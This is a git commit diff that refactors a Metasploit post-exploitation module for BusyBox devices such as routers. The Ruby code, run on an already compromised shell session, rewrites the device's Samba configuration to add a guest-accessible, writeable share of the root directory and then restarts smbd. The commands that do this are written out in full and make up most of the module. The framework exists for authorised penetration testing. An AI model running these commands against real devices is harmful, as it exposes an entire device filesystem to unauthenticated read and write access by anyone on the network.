edc9982c8b2bf82277589e35a61e0189b55da157
jvazquez-r7 <juan_vazquez@rapid7.com>
2015-08-28 11:18:49 -0500

    Review smb_share_root

--- modules/post/linux/busybox/smb_share_root.rb
+++ modules/post/linux/busybox/smb_share_root.rb
@@ -12,43 +12,48 @@ class Metasploit3 < Msf::Post
 
   def initialize
     super(
-      'Name'         => 'BusyBox Smb Share Root',
-      'Description'  => 'This module will be applied on a session connected
-                         to a BusyBox sh shell. The script will modify the
-                         smb configuration of the the router or device executing
-                         BusyBox to share the root directory of the device.',
+      'Name'         => 'BusyBox SMB Sharing',
+      'Description'  => %q{
+        This module will be applied on a session connected to a BusyBox shell. It will modify
+        the SMB configuration of the device executing BusyBox to share the root directory of
+        the device.
+      },
       'Author'       => 'Javier Vicente Vallejo',
       'License'      => MSF_LICENSE,
-      'References'   =>
-        [
-          [ 'URL', 'http://vallejo.cc']
-        ],
-      'Platform'      => ['linux'],
-       'SessionTypes'  => ['shell']
+      'Platform'     => ['linux'],
+      'SessionTypes' => ['shell']
     )
   end
 
   def run
-    vprint_status("Trying to find smb.conf.")
-    if read_file("/var/samba/smb.conf").length > 0 #file? doesnt work because test -f is not implemented in busybox
-      vprint_status("Smb.conf found.")
-      vprint_status("Trying to find writable directory.")
-      writable_directory = get_writable_directory()
+    print_status('Checking smb.conf...')
+    if read_file('/var/samba/smb.conf').length > 0 #file? doesnt work because test -f is not implemented in busybox
+      print_status('smb.conf found, searching writable directory...')
+      writable_directory = get_writable_directory
       if writable_directory
-        vprint_status("writable directory found, copying smb.conf.")
-        vprint_status(cmd_exec("rm -f #{writable_directory}smb.conf")); Rex::sleep(0.1)
-        vprint_status(cmd_exec("cp -f /var/samba/smb.conf #{writable_directory}smb.conf")); Rex::sleep(0.1)
-        vprint_status(cmd_exec("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{writable_directory}smb.conf")); Rex::sleep(0.1)
-        vprint_status(cmd_exec("killall smbd")); Rex::sleep(0.1)
-        vprint_status(cmd_exec("smbd -D -s #{writable_directory}smb.conf")); Rex::sleep(0.1)
-        vprint_status(cmd_exec("smbd -D -s=#{writable_directory}smb.conf")); Rex::sleep(0.1)
-        print_good("Smb configuration has been modified.")
+        print_status('writable directory found, copying smb.conf and restarting smbd')
+        copy_smb_conf(writable_directory)
       else
-        print_error("Writable directory not found.")
+        print_error('Writable directory not found')
       end
     else
-      print_error("Smb.conf not found.")
+      print_error('smb.conf not found')
     end
+  end
+
+  def copy_smb_conf(dir)
+    cmd_exec_delay("rm -f #{dir}smb.conf")
+    cmd_exec_delay("cp -f /var/samba/smb.conf #{dir}smb.conf")
+    cmd_exec_delay("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{dir}smb.conf")
+    cmd_exec_delay('killall smbd')
+    cmd_exec_delay("smbd -D -s #{dir}smb.conf")
+    cmd_exec_delay("smbd -D -s=#{dir}smb.conf")
+  end
+
+  def cmd_exec_delay(command)
+    res = cmd_exec(command)
+    vprint_status(res)
+    Rex.sleep(0.1)
   end
 
 end
